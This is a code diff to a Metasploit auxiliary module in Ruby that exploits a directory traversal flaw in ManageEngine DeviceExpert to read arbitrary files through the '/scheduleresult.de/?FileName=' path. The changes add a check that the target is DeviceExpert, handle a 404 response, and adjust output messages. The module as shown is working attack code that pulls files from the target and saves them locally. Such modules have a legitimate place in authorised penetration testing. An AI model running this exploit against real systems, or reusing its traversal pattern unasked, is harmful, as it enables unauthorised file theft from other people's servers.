@@ -46,12 +46,28 @@ class MetasploitModule < Msf::Auxiliary
     filename = datastore['FILEPATH']
 
     res = send_request_raw({
+      'uri' => "/scheduleresult.de",
+      'method' => 'GET'
+    }, 25)
+
+    if res && res.code != 200
+      print_error("Target is not ManageEngine DeviceExpert")
+      return
+    end
+
+    res = send_request_raw({
       'uri' => "/scheduleresult.de/?FileName=#{traverse}#{filename}",
       'method' => 'GET'
     }, 25)
 
     if res
-      print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
+      case res.code
+      when 200
+        print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
+      when 404
+        print_error("#{ip}:#{rport} - file not found")
+        return
+      end
     else
       print_error("Unable to communicate with #{ip}:#{rport}")
       return
@@ -68,7 +84,7 @@ class MetasploitModule < Msf::Auxiliary
         res.body,
         fname)
 
-      print_status("#{ip}:#{rport} - File saved in: #{path}")
+      print_good("#{ip}:#{rport} - File saved in: #{path}")
     end
   end
 end
